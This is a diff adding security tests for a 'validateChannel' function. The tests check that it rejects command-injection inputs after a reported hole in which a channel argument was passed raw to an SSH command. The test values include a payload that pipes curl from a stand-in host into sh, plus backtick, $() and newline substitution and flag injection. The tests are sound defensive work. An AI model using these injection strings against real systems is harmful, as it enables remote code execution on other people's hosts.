@@ -26,6 +26,7 @@ import {
   validateAgentName,
   validateScheduleValue,
   validateCronId,
+  validateChannel,
   validateDeployService,
   shellQuote,
 } from '../src/validate.js';
@@ -573,6 +574,54 @@ describe('validateContainerName (security)', () => {
   });
   it('rejects empty string', () => {
     assert.throws(() => validateContainerName(''), /must not be empty/);
+  });
+});
+
+describe('validateChannel (security)', () => {
+  // The three names the zod description documents must keep working.
+  it('accepts whatsapp', () => {
+    assert.equal(validateChannel('whatsapp'), 'whatsapp');
+  });
+  it('accepts telegram', () => {
+    assert.equal(validateChannel('telegram'), 'telegram');
+  });
+  it('accepts last', () => {
+    assert.equal(validateChannel('last'), 'last');
+  });
+  it('accepts a future channel name with a dot, hyphen or underscore', () => {
+    assert.equal(validateChannel('signal-v2.1_beta'), 'signal-v2.1_beta');
+  });
+
+  // The reported payload. `--channel` was pushed raw into a string that is
+  // joined and handed to sshExec, so this ran on the remote host as the SSH user.
+  it('rejects the reported semicolon payload', () => {
+    assert.throws(() => validateChannel('whatsapp; curl http://x/y | sh'), /Invalid channel/);
+  });
+  it('rejects backtick substitution', () => {
+    assert.throws(() => validateChannel('whatsapp`id`'), /Invalid channel/);
+  });
+  it('rejects dollar-sign subshell', () => {
+    assert.throws(() => validateChannel('whatsapp$(id)'), /Invalid channel/);
+  });
+  it('rejects a pipe', () => {
+    assert.throws(() => validateChannel('whatsapp | tee /tmp/x'), /Invalid channel/);
+  });
+  it('rejects newline-separated commands', () => {
+    assert.throws(() => validateChannel('whatsapp\nid'), /Invalid channel/);
+  });
+  it('rejects a quote that would escape the surrounding quoting', () => {
+    assert.throws(() => validateChannel("whatsapp'; id; '"), /Invalid channel/);
+  });
+  // A leading hyphen is flag injection rather than command injection: it would
+  // be read by openclaw as another option instead of as a channel value.
+  it('rejects a leading hyphen (flag injection)', () => {
+    assert.throws(() => validateChannel('--announce'), /Invalid channel/);
+  });
+  it('rejects empty', () => {
+    assert.throws(() => validateChannel(''), /must not be empty/);
+  });
+  it('rejects over-long input', () => {
+    assert.throws(() => validateChannel('a'.repeat(65)), /too long/);
   });
 });
 
